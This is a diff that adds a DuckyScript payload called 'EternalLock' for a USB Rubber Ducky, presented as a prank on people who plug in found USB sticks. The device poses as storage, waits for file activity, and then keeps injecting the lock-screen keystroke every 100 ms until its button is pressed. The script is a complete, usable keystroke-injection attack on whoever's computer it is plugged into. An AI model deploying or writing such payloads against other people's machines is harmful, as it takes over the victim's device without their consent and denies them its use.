@@ -1,0 +1,54 @@
+REM     EternalLock
+REM     Version 1.0
+REM     OS: Windows / Unix
+REM     Author: 0iphor13
+REM     Requirement: DuckyScript 3.0
+REM     A lil' prank for all the ones snooping on your usb sticks. This will lock the machine every 100ms until the button is pressed (or ther ducky pulled out)
+
+ATTACKMODE HID STORAGE
+
+REM Extension DETECT_READY by Korben for best and fastest deployment
+EXTENSION DETECT_READY
+    REM VERSION 1.0
+
+    REM USAGE:
+    REM Extension runs inline (here)
+    REM Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+    REM boot delay
+
+    REM TARGETS:
+    REM Any system that reflects CAPSLOCK will detect minimum required delay
+    REM Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+
+    REM CONFIGURATION:
+    DEFINE RESPONSE_DELAY 25
+    DEFINE ITERATION_LIMIT 120
+
+    VAR $C = 0
+    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < ITERATION_LIMIT))
+        CAPSLOCK
+        DELAY RESPONSE_DELAY
+        $C = ($C + 1)
+    END_WHILE
+    CAPSLOCK
+END_EXTENSION
+
+REM Delay until the machine gets locked
+DEFINE #TRIPWIRETIME 3000
+REM Time between forced machine locks
+DEFINE #LOCKTIME 100
+
+WAIT_FOR_STORAGE_ACTIVITY
+DELAY #TRIPWIRETIME
+
+BUTTON_DEF
+    WHILE TRUE
+        ATTACKMODE STORAGE
+    END_WHILE
+END_BUTTON
+
+REM Lock machine until Button is pressed
+WHILE TRUE
+GUI l
+DELAY #LOCKTIME
+END_WHILE
